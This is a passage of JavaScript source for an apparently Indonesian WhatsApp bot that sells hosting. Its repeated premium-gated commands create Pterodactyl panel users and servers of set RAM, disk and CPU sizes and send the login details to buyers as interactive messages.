"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "4gb": case 'panel4gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4050"
let cpu = "400"
let disk = "4050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "5gb": case 'panel5gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5050"
let cpu = "500"
let disk = "5050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "6gb": case 'panel6gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6050"
let cpu = "600"
let disk = "6050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "7gb": case 'panel7gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7050"
let cpu = "650"
let disk = "7050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "8gb": case 'panel8gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8050"
let cpu = "700"
let disk = "8050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "9gb": case 'panel9gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "9050"
let cpu = "750"
let disk = "9050"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
